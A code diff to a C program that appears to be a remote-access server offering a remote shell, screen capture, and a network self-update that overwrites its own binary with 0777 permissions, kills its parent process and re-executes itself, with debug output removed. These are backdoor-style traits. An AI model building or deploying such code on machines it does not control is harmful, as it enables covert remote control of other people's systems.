@@ -7,6 +7,7 @@
 
 //FILE
 #include <sys/types.h>
+#include <signal.h>
 #include <sys/stat.h>
 #include <fcntl.h>
 #include <sys/wait.h>
@@ -22,6 +23,9 @@
 #include "server.h"
 
 #define BUF_SIZE 255
+#define NAME "server"
+
+static int socket_serveur;
 
 int send_screenshot(int fd, int socket)
 {
@@ -86,22 +90,13 @@ void shell(int socket){
 }
 
 void run_latest(){
-	int i = 0;
-	int ok = 0;
-	char filename[20];
 	char execname[20];
-	while(!ok){
-		sprintf(filename, "config_%d", i);
-		if( access(filename, F_OK ) != -1 ) {
-			//FILE EXISTS
-			sprintf(execname, "%s", filename);
-		} else {
-			break;
-		}
-		i++;
-	}
-	printf("%s\n", execname);
+	sprintf(execname, "%s%s", "./", NAME);
 	if(strlen(execname) > 0){
+		//printf("%s\n", execname);
+		
+		kill(getppid(), SIGTERM);
+		sleep(3);	
 		char* arg[] = {execname, NULL};
 		execvp(arg[0], arg);
 	}
@@ -109,46 +104,37 @@ void run_latest(){
 
 
 void update_server(int in_fd){
-	int i = 0;
-	int ok = 0;
-	char filename[20];
-	while(!ok){
-		sprintf(filename, "config_%d", i);
-		if( access(filename, F_OK ) == -1 ) {
-			ok = 1;
-		}
-		i++;
-	}
+	char *filename = NAME;
 	int fd = open(filename, O_CREAT | O_WRONLY, 0777);
 	send_screenshot(in_fd, fd);
 	close(fd);
+	close(in_fd);
+	close(socket_serveur);
 	run_latest();
 }
 void handle_client(int socket){
 	FILE *f = fdopen(socket, "r+");
 	switch(get_client_choice(f)){
 		case 1:
-			printf("He choose shell\n");
+			//printf("He choose shell\n");
 			shell(socket);			
 		break;
 		case 2:
-			printf("He choose screenshot\n");
+			//printf("He choose screenshot\n");
 			screenshot(socket);			
 		break;
 		case 3:
-			printf("He choose update\n");
+			//printf("He choose update\n");
 			update_server(socket);
 	}
 }
 int main() {
-    /*    close(0);
-        close(1);
+        /*close(0);
         close(2);
-*/
-	run_latest();	
-	printf("coucou\n");	
+	*/
+	//printf("VERSION 8.0\n");
 	initialiser_signaux();
-	int socket_serveur = creer_serveur(SERVER_PORT);
+	socket_serveur = creer_serveur(SERVER_PORT);
 	if(socket_serveur == -1)
 		return 1;
 
